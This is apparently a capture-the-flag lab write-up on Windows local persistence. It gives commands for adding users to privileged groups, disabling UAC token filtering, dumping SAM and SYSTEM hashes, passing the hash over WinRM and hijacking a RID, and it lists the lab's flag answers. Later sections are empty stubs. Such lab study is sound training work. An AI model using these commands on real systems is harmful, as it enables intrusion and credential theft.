# Windows Local Persistence - Medium

1. [Tampering with Unprivileged Accounts](#tampering-with-unprivileged-accounts)
2. [Backdooring Files](#backdooring-files)
3. [Abusing Services](#abusing-services)
4. [Abusing Scheduled Tasks](#abusing-scheduled-tasks)
5. [Logon Triggered Persistence](#logon-triggered-persistence)
6. [Backdooring the Login Screen / RDP](#backdooring-the-login-screen--rdp)
7. [Persisting Through Existing Services](#persisting-through-existing-services)

## Tampering with Unprivileged Accounts

* Persistence - creating alternative ways to regain access to a host without going through exploitation all over again.

* Tampering with unprivileged users makes it harder for the blue teams to detect activity.

* Assign Group Memberships:

```cmd
#assuming we have dumped hashes in victim machine
#and acquired passwords of unprivileged users

#add unprivileged user to Administrators group for admin privileges
net localgroup administrators thmuser0 /add
```

```cmd
#we can also use Backup Operators group
net localgroup "Backup Operators" thmuser1 /add

#now we need it to add it to RDP or WinRM groups
net localgroup "Remote Management Users" thmuser1 /add

#disable LocalAccountTokenFilterPolicy of UAC to get admin privileges
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1

#given, creds for WinRM are thmuser1:Password321
#WinRM connection from attacker machine
evil-winrm -i 10.10.113.252 -u thmuser1 -p Password321

#gives Admin access
whoami /groups

#make backup of SAM and SYSTEM files and download them
reg save hklm\system system.bak

reg save hklm\sam sam.bak

download system.bak

download sam.bak

#dump password hashes in attacker machine
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL

#perform pass-the-hash to get Admin privileges in target machine
evil-winrm -i 10.10.113.252 -u Administrator -H f3118544a831e728781d780cfdb9c1fa

cd C:\flags

.\flag1.exe
```

* Special Privileges and Security Descriptors:

```cmd
#the Backups Operators group has SeBackupPrivilege and SeRestorePrivilege enabled
#we can assign these privileges to any user

#export current config to temp file
secedit /export /cfg config.inf

#edit config.inf file such that the user 'thmuser2' is added in the privileges required

#convert .inf to .sdb and load config file
secedit /import /cfg config.inf /db config.sdb

secedit /configure /db config.sdb /cfg config.inf

#now edit security descriptor for WinRM
#in powershell
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
#add and give full permissions to 'thmuser2'

#we can connect to WinRM from attacker machine now
#thmuser2:Password321
evil-winrm -i 10.10.113.252 -u thmuser2 -p Password321

net user thmuser2

C:\flags\.\flag2.exe
```

* RID Hijacking:

```cmd
#we can tamper with the registry value of RID (relative ID)
#and make Windows assign Admin access token to unprivileged user
#by giving them both same RIDs
#admin RID=500

#get RIDs
wmic useraccount get name,sid
#RID is last part of SID
#thmuser3 RID is 1010

cd C:\tools\pstools

#running Regedit using SYSTEM account to access SAM
PsExec64.exe -i -s regedit

#in regedit, navigate to HKLM\SAM\SAM\Domains\Account\Users
#here, RID is in hex, so hex of 1010 is 0x3F2
#in that, edit the 'F' value from F203 to F401
#it uses little-endian notation, so the bytes are reversed

#now we can use RDP to login as thmuser3
#thmuser3:Password321
xfreerdp /u:thmuser3 /p:Password321 /v:10.10.113.252

C:\flags\.\flag3.exe
```

```markdown
1. flag1? - THM{FLAG_BACKED_UP!}

2. flag2? - THM{IM_JUST_A_NORMAL_USER}

3. flag3? - THM{TRUST_ME_IM_AN_ADMIN}
```

## Backdooring Files

```markdown
1. flag5?

2. flag6?
```

## Abusing Services

```markdown
1. flag7?

2. flag8?
```

## Abusing Scheduled Tasks

```markdown
1. flag9?
```

## Logon Triggered Persistence

```markdown
1. flag10?

2. flag11?

3. flag12?

4. flag13?
```

## Backdooring the Login Screen / RDP

```markdown
1. flag14?

2. flag15?
```

## Persisting Through Existing Services

```markdown
1. flag16?

2. flag17?
```
